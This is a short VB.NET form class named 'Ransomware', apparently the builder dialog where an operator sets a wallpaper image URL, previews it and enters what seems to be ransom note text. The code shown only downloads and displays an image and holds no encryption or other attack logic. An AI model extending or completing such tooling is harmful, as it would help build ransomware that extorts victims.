Imports System.Drawing
Imports System.IO
Imports System.Net

Public Class Ransomware
    Public OK As Boolean
    Public o As New OpenFileDialog

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try

            Dim tClient As WebClient = New WebClient
            Dim tImage As Bitmap = Bitmap.FromStream(New MemoryStream(tClient.DownloadData(Textbox1.Text)))
            PictureBox1.Image = tImage
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, Nothing)
        End Try


    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        If Textbox1.Text <> Nothing AndAlso RichTextBox1.Text <> Nothing Then
            OK = True
            Me.Close()
        Else
            MsgBox("Please select wallpaper", MsgBoxStyle.Information)
            Return
        End If
    End Sub


End Class